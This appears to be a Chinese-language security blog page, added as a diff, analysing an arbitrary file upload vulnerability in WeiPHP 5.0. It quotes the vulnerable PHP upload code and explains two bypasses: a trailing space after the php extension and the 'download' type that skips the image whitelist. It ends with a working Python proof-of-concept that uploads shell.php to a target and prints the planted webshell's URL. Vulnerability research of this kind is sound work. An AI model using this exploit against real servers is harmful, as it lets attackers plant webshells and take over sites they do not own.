@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Weiphp5.0任意文件上传 | 闪电&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="application\common.php 123456789101112131415161718192021222324252627282930313233343536function upload_files($setting = &apos;&apos;, $driver = &apos;&apos;, $config = &apos;&apos;, $type = &apos;picture&apos;, $isTest = false)&amp;#123;    ...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weiphp5.0任意文件上传">
+<meta property="og:url" content="http://yoursite.com/2021/06/30/Weiphp5-0任意文件上传/index.html">
+<meta property="og:site_name" content="闪电&#39;s Blog">
+<meta property="og:description" content="application\common.php 123456789101112131415161718192021222324252627282930313233343536function upload_files($setting = &apos;&apos;, $driver = &apos;&apos;, $config = &apos;&apos;, $type = &apos;picture&apos;, $isTest = false)&amp;#123;    ...">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/Article_images/Clip_20210630_144156.png">
+<meta property="og:image" content="http://yoursite.com/images/Article_images/Clip_20210630_144355.png">
+<meta property="og:updated_time" content="2021-06-30T06:45:46.589Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weiphp5.0任意文件上传">
+<meta name="twitter:description" content="application\common.php 123456789101112131415161718192021222324252627282930313233343536function upload_files($setting = &apos;&apos;, $driver = &apos;&apos;, $config = &apos;&apos;, $type = &apos;picture&apos;, $isTest = false)&amp;#123;    ...">
+<meta name="twitter:image" content="http://yoursite.com/images/Article_images/Clip_20210630_144156.png">
+  
+    <link rel="alternate" href="/atom.xml" title="闪电&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+</head>
+</html>
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-Weiphp5-0任意文件上传" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      Weiphp5.0任意文件上传
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2021/06/30/Weiphp5-0任意文件上传/" class="article-date">
+  <time datetime="2021-06-30T06:45:08.000Z" itemprop="datePublished">2021-06-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
+  </div>
+
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>application\common.php</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_files</span><span class="params">($setting = <span class="string">''</span>, $driver = <span class="string">''</span>, $config = <span class="string">''</span>, $type = <span class="string">'picture'</span>, $isTest = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">        <span class="comment">//判断扩展名是不是php,不支持上传php文件</span></span><br><span class="line">        $info = $file-&gt;getInfo();</span><br><span class="line">        $info = pathinfo($info[<span class="string">'name'</span>]);</span><br><span class="line">        <span class="comment">//这里判断后缀是否为php，可以加空格绕过</span></span><br><span class="line">        <span class="keyword">if</span> (strtolower($info[<span class="string">'extension'</span>]) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            $return[<span class="string">'msg'</span>] = <span class="string">'不支持上传该文件类型'</span>;</span><br><span class="line">            $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">            $redata[$key] = $return;</span><br><span class="line">            <span class="keyword">return</span> $redata;</span><br><span class="line">        &#125;</span><br><span class="line">        $checkRule = [];</span><br><span class="line">        <span class="keyword">if</span> ($type == <span class="string">'picture'</span>) &#123;</span><br><span class="line">            <span class="comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">            $checkRule[<span class="string">'ext'</span>] = <span class="string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">            $checkRule[<span class="string">'size'</span>] = <span class="number">20971520</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $allowExt = input(<span class="string">'allow_file_ext'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowExt != <span class="string">''</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'ext'</span>] = $allowExt;</span><br><span class="line">            &#125;</span><br><span class="line">            $allowSize = input(<span class="string">'allow_file_maxsize'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'size'</span>] = $allowSize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $info = $file-&gt;isTest($isTest)</span><br><span class="line">            -&gt;rule(<span class="string">'uniqid'</span>)</span><br><span class="line">            -&gt;validate($checkRule)</span><br><span class="line">            -&gt;move($rootpath, DIRECTORY_SEPARATOR . $saveName);</span><br><span class="line">		...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里$type==’picture’，后面有个调用这个方法的，然后$type==’download’ 绕过了这个限制</p>
+<p>application\home\model\File.php</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($setting = [], $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/* 上传文件 */</span></span><br><span class="line">       $setting[<span class="string">'callback'</span>] = <span class="keyword">array</span>(</span><br><span class="line">           <span class="keyword">$this</span>,</span><br><span class="line">           <span class="string">'isFile'</span></span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       $info = upload_files($setting, $driver, $config, <span class="string">'download'</span>, $isTest);</span><br><span class="line">    ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>application\home\controller\File.php    这里找到了调用upload</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   	<span class="comment">//用户登录检测</span></span><br><span class="line">   	<span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">   		$return = <span class="keyword">array</span>(</span><br><span class="line">   				<span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   				<span class="string">'code'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">   				<span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'msg'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">   		);</span><br><span class="line">   		<span class="keyword">return</span> json_encode($return);</span><br><span class="line">   	&#125;</span><br><span class="line">       $return = <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">           <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">           <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">       );</span><br><span class="line">       <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">       $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">       $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">       $info = $File-&gt;upload(config(<span class="string">'download_upload'</span>), config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line">       <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">       <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">           $return = array_merge($info[<span class="string">'download'</span>], $return);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">           $return[<span class="string">'msg'</span>] = $return[<span class="string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">/* 返回JSON数据 */</span></span><br><span class="line">       <span class="keyword">return</span> json_encode($return);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>构造上传</p>
+<p><img src="/images/Article_images/Clip_20210630_144156.png" alt="Clip_20210630_144156"></p>
+<p>poc</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(target)</span>:</span></span><br><span class="line">	vul=target+<span class="string">'/public/index.php/home/File/upload_root'</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		files=&#123;</span><br><span class="line">		<span class="string">'download'</span>:(<span class="string">'1ight0.php '</span>,open(<span class="string">'shell.php'</span>,<span class="string">'rb'</span>),<span class="string">'image/png'</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		res=requests.post(url=vul,files=files,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).text</span><br><span class="line">		jsonres=json.loads(res)</span><br><span class="line">		shellpath=target+<span class="string">'/public/uploads/download'</span>+jsonres[<span class="string">'savepath'</span>]+jsonres[<span class="string">'savename'</span>].strip()</span><br><span class="line">		<span class="keyword">if</span> requests.get(url=shellpath,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).status_code == <span class="number">200</span>:</span><br><span class="line">			print(<span class="string">'shell-----&gt; '</span>,shellpath)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'目标不存在漏洞'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		target=sys.argv[<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">			target=<span class="string">'http://'</span>+target</span><br><span class="line">		poc(target)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'python poc.py 目标'</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/images/Article_images/Clip_20210630_144355.png" alt="Clip_20210630_144355"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2021/06/28/9-2后台登录绕过/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">youdiancms9.2后台登录绕过&#39;</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        闪电啊哈哈
+      
+    </h3>
+    <p class="avatar-slogan">
+      何必管一片海，有多澎湃
+    </p>
+  </div>
+</div>
+
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB相关/">WEB相关</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/">无线渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络工程/">网络工程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机操作系统/">计算机操作系统</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/06/30/Weiphp5-0任意文件上传/">Weiphp5.0任意文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/03/操作系统概述/">操作系统概述</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/30/关于php反序列化漏洞小记/">关于php反序列化漏洞小记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2021 闪电 &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
